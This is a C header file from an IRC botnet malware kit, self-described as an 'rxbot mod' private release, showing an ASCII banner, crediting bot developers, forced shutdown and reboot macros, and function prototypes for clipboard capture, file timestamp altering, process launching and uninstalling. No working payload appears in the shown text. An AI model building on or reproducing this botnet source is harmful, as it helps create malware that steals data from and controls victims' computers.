/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

#define SHTDN_REASON_MAJOR_SYSTEM	0x00050000 // ripped from reason.h
#define SHTDN_REASON_MINOR_HUNG		0x00000005

#define SHUTDOWN_SYSTEM_HUNG		(SHTDN_REASON_MAJOR_SYSTEM|SHTDN_REASON_MINOR_HUNG) // for XP,2k only ignored on 9x
#define EWX_SYSTEM_REBOOT			(EWX_REBOOT | EWX_FORCE)
#define EWX_FORCE_SHUTDOWN			(EWX_SHUTDOWN | EWX_POWEROFF | EWX_FORCE)


//char *replacestr(char *str, char *oldstr, char *newstr);
char *replacestr(char *str, const char *substr, const char *repstr);
int Split(char *inStr, void *saveArray);
void initskip(char *s, int len, int skip[1024]);
void sp2mod(void);
int lstrindex(char c);
char *lstrstr(char *s, char *t);
char *PrintError(char *msg);
char *GetClipboardText(void);
BOOL mirccmd(char *cmd);
void SetFileTime(char *Filename);
DWORD CreateProc(char *file, char *param);
BOOL Reboot(void);
void uninstall(void);
